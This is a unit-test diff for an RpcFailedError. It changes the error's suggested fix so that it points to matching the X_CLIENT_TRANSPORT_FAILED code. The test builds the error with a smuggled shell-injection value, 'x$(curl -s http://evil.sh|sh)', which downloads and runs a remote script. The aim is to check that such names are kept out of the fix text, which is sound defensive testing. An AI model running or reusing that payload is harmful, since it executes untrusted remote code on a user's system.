@@ -56,17 +56,12 @@ describe('unit · docs', () => {
   });
 });
 
-describe('unit · X_RPC_FAILED pastes a command a hostile name cannot run through', () => {
-  test('an ordinary action name travels verbatim', () => {
-    expect(new RpcFailedError('publishPost', 502).fix).toContain(
-      'x actions show publishPost --json',
-    );
-  });
-
-  test('a name that is not shell-safe becomes the placeholder, and stays in the cause', () => {
+describe('unit · X_RPC_FAILED points at the code that replaced it', () => {
+  test("the fix is the wiki's: match X_CLIENT_TRANSPORT_FAILED, nothing a name can reach", () => {
     const error = new RpcFailedError('x$(curl -s http://evil.sh|sh)', 502);
-    expect(error.fix).not.toContain('$(');
-    expect(error.fix).toContain('x actions show <action-name> --json');
+    expect(error.fix).toBe(
+      "match X_CLIENT_TRANSPORT_FAILED instead: isUltimateError(e) && e.code === 'X_CLIENT_TRANSPORT_FAILED', with isUltimateError from @ultimat3/core",
+    );
     expect(error.cause).toContain('evil.sh');
   });
 });
